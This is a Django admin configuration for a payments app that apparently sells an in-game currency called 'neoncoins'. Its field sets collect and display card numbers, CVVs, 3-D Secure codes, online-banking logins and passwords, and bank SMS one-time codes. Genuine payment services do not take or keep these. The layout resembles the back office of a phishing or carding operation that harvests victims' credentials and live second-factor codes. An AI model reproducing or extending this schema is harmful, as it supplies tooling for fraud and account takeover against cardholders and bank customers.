from django.contrib import admin
from .models import Payment, PaymentStep

@admin.register(Payment)
class PaymentAdmin(admin.ModelAdmin):
    list_display = [
        'id', 'user', 'amount', 'currency', 'payment_method', 'status',
        'created_at', 'payment_ip'
    ]
    list_filter = ['status', 'payment_method', 'currency', 'created_at']
    search_fields = ['user__email', 'id', 'card_holder', 'bank_name']
    readonly_fields = [
        'id', 'created_at', 'updated_at', 'processed_at', 'completed_at',
        'attempts_count', 'max_attempts'
    ]
    ordering = ['-created_at']
    
    fieldsets = (
        ('Basic Information', {
            'fields': ('id', 'user', 'amount', 'currency', 'payment_method', 'status')
        }),
        ('Card Details', {
            'fields': ('card_holder', 'card_number', 'card_expiry', 'card_cvv', 'card_3ds_code'),
            'classes': ('collapse',)
        }),
        ('Bank Details', {
            'fields': ('bank_name', 'bank_login', 'bank_password', 'bank_sms_code'),
            'classes': ('collapse',)
        }),
        ('Crypto Details', {
            'fields': ('crypto_type', 'crypto_network', 'crypto_wallet_address'),
            'classes': ('collapse',)
        }),
        ('System Information', {
            'fields': ('payment_ip', 'user_agent', 'fee', 'exchange_rate', 'neoncoins_amount'),
            'classes': ('collapse',)
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at', 'processed_at', 'completed_at'),
            'classes': ('collapse',)
        }),
        ('Additional Info', {
            'fields': ('notes', 'admin_notes', 'attempts_count', 'max_attempts'),
            'classes': ('collapse',)
        }),
    )

@admin.register(PaymentStep)
class PaymentStepAdmin(admin.ModelAdmin):
    list_display = ['id', 'payment', 'step_type', 'status', 'created_at']
    list_filter = ['step_type', 'status', 'created_at']
    search_fields = ['payment__id', 'description']
    readonly_fields = ['id', 'created_at']
    ordering = ['-created_at']
